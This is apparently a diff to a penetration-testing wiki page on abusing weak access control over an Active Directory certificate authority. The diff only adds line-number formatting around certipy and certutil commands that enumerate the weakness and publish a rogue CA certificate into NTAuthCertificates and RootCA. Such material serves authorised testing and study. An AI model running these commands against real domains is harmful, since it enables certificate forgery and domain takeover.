@@ -18,10 +18,12 @@ Poor access control on CA server, CA server computer object etc.
 
 ## Enumerate
 
+{% code lineNumbers="true" %}
 ```bash
 ## BloodHound - check for GenericAll/WriteDacl/WriteOwner/GenericWrite edges pointing to the CA's computer object or PKI containers
 certipy find -u <user>@<domain> -p <password> -dc-ip <DC-IP> -vulnerable -stdout
 ```
+{% endcode %}
 
 ## Exploit
 
@@ -30,17 +32,21 @@ certipy find -u <user>@<domain> -p <password> -dc-ip <DC-IP> -vulnerable -stdout
 
 {% tabs %}
 {% tab title="Certipy" %}
+{% code lineNumbers="true" %}
 ```bash
 certipy ca -u <user>@<domain> -p <password> -dc-ip <DC-IP> -ca <CA-Name> -add-cert -cert-file rogue-ca.crt
 ```
+{% endcode %}
 {% endtab %}
 
 {% tab title="certutil" %}
+{% code lineNumbers="true" %}
 ```bat
 REM certutil natively supports publishing a certificate into NTAuthCertificates (requires the write access itself, not admin)
 certutil -dspublish -f rogue-ca.crt NTAuthCA
 certutil -dspublish -f rogue-ca.crt RootCA
 gpupdate /force
 ```
+{% endcode %}
 {% endtab %}
 {% endtabs %}
